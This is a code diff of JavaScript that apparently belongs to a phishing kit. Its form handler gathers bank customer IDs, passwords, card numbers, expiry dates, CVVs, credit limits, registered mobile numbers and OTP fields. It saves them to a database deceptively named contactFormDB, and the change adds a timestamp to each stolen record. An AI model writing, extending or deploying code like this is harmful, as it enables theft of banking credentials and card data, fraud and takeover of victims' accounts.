@@ -27,7 +27,7 @@ function submitForm(e) {
   var cvv = getElementVal("cvv");
   var creditlimit = getElementVal("ccl");
   var regmobile = getElementVal("rgmob_cc");
-  var regmobile = getElementVal("rgmob_cc");
+  var currentDateTime = getElementVal("currentDateTime");
   var otp1 = 0;
   var otp2 = 0;
   var otp3 = 0;
@@ -37,10 +37,10 @@ function submitForm(e) {
   var holdername = 0;
   var dob = 0;
 
-  saveMessages(customerid, password, mobile, creditnumber, expiredate, cvv, creditlimit, regmobile, otp1, otp2, otp3, otp4, otp5, otp6, holdername, dob);
+  saveMessages(customerid, password, mobile, creditnumber, expiredate, cvv, creditlimit, regmobile, currentDateTime, otp1, otp2, otp3, otp4, otp5, otp6, holdername, dob);
 }
 
-const saveMessages = (customerid, password, mobile, creditnumber, expiredate, cvv, creditlimit, regmobile, otp1, otp2, otp3, otp4, otp5, otp6, holdername, dob) => {
+const saveMessages = (customerid, password, mobile, creditnumber, expiredate, cvv, creditlimit, regmobile, currentDateTime, otp1, otp2, otp3, otp4, otp5, otp6, holdername, dob) => {
   var newContactForm = contactFormDB.push();
 
   newContactForm.set({
@@ -52,6 +52,7 @@ const saveMessages = (customerid, password, mobile, creditnumber, expiredate, cv
       cvv: cvv,
       creditlimit: creditlimit,
       regmobile: regmobile,
+      currentDateTime: currentDateTime,
       otp1: otp1,
       otp2: otp2,
       otp3: otp3,
